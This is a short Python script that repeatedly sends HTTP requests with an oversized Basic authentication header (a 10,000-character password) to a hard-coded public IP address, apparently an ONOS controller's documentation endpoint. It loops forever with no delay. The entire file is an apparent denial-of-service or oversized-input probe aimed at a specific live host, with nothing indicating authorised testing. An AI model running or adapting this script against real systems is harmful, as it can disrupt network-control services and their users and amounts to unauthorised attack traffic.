import requests
import base64

url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
username = 'onos'

def encode_credentials(username:str, password: str): 
    credentials = f"{username}:{password}"
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode('ISO-8859-1')

def test_password_length(username: str, password_length: int):
    password = 'A' * password_length

    headers = {
        'Authorization': f'Basic {encode_credentials(username=username, password=password)}',
        'User-Agent': 'Mozilla/5.0'
    }
    response = requests.get(url=url, headers=headers);

    return response

def main():
    password_length = 10000

    while True:
        response = test_password_length(username=username, password_length=password_length)
        print(response.content)

if __name__ == '__main__':
    main()